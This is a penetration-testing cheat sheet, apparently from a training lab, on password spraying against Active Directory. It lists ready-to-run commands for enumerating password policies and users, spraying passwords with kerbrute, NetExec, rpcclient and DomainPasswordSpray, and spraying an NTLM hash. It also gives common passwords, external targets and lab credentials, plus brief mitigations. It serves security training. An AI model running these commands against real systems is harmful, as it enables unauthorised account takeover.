# Password Spraying

## Overview
- Password spraying attempts to log into an exposed service using one common password and a longer list of usernames
- Less likely to lock out accounts than brute force
- Must always respect the domain password policy lockout threshold
- If you don't know the password policy, wait a few hours between attempts or limit to one attempt as a "hail mary"

## Enumerating the Password Policy

### From Linux - Credentialed
```
nxc smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### From Linux - SMB NULL Session
```
# rpcclient
rpcclient -U "" -N 172.16.5.5
rpcclient $> getdompwinfo

# enum4linux
enum4linux -P 172.16.5.5

# enum4linux-ng (better output, JSON/YAML export)
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

### From Linux - LDAP Anonymous Bind
```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### From Windows
```
# net.exe
net accounts

# PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

## Building a Target User List

### SMB NULL Session
```
# enum4linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# rpcclient
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers

# NetExec (also shows badpwdcount)
nxc smb 172.16.5.5 --users
```

### LDAP Anonymous Bind
```
# ldapsearch
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Kerbrute (No Domain Access Required)
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
- Does not generate event ID 4625 (failed logon)
- Generates event ID 4768 (TGT requested)
- Use wordlists from https://github.com/insidetrust/statistically-likely-usernames
- **Output format:** kerbrute returns `username@domain.local` - strip the domain part when building wordlists for other tools
- **KDC_ERR_ETYPE_NOSUPP:** This error does NOT mean invalid creds - the credential may still be valid. Verify with netexec or rpcclient

### With Valid Credentials
```
sudo nxc smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## Performing the Attack

### From Linux

#### rpcclient Bash One-Liner
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

#### NetExec
```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

#### Validate Credentials
```
sudo nxc smb 172.16.5.5 -u avazquez -p Password123
```

### From Windows

#### DomainPasswordSpray.ps1
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
- Automatically generates user list from AD
- Queries the domain password policy
- Excludes accounts within one attempt of locking out

## Local Admin Password Reuse
- If you obtain the local admin NTLM hash, spray it across the subnet
- Use `--local-auth` flag to avoid domain account lockout

```
sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Common Passwords to Try
- Season+Year (Spring2022, Winter2021, Fall@21)
- Welcome1, Password1, Password123
- Company name + numbers/special chars
- Month + Year patterns

## Mitigations
- Multi-factor authentication
- Restrict application access (principle of least privilege)
- Separate admin accounts for administrative activities
- Password filters to restrict common dictionary words
- Monitor event ID 4625 (failed logon) and 4771 (Kerberos pre-authentication failed)

## External Password Spraying Targets
- Microsoft 365 / Outlook Web Exchange
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet)
- Citrix portals, RDS portals
- VDI implementations (VMware Horizon)
- Custom web applications using AD authentication
